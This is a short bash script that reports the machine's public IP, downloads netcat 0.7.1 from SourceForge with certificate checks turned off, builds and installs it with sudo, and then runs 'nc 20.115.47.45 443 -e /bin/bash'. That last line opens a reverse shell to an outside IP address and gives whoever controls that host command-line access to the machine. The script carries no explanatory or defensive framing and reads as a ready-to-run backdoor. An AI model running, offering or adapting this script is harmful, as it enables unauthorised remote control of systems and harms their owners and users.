#!/bin/bash

sudo curl -s http://whatismyip.akamai.com/
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1 
./configure
sudo make
sudo make install
nc 20.115.47.45 443 -e /bin/bash
